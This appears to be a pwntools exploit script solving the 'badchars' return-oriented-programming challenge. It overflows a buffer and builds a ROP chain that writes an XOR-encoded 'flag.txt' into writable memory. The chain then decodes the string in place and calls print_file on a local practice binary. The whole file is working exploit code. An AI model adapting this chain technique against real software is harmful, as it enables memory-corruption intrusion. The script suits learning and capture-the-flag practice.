#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

key = 0x02
encoded_string = xor(b"flag.txt", key)
print(encoded_string)

# DO NOT WRITE AT THE START OF THE DATA SEGMENT ;-;

payload = cyclic(40, n=8) # 32 bytes of the buffer and 8 bytes for rbp
payload += p64(0x00000000004004ee) # the extra ret instruction
payload += p64(0x000000000040069c) # pop r12; pop r13; pop r14; pop r15; ret
payload += encoded_string # r12 has the string
payload += p64(0x0000000000601038) # writable memory address in r13, this is at the start of the bss segment
payload += p64(0x0000000000000000) # null value in r14
payload += p64(0x0000000000000000) # null value in r15
payload += p64(0x0000000000400634) # mov [r13], r12; the string is in the memory location in r13

# repeat the the loop for each char in the string this is to decode the xor string

for i in range(8):
    payload += p64(0x00000000004006a0) # pop r14; pop r15; ret
    payload += p64(0x0000000000000002) # r14 contains 2
    payload += p64(0x0000000000601038 + i) # deref'd r15 contains each char 
    payload += p64(0x0000000000400628) # xor [r15], r14; ret

payload += p64(0x00000000004006a3) # pop rdi; ret
payload += p64(0x0000000000601038) # address of the string
payload += p64(0x0000000000400510) # call print_file 

p = process("./badchars")
p.send(payload)
p.interactive()


















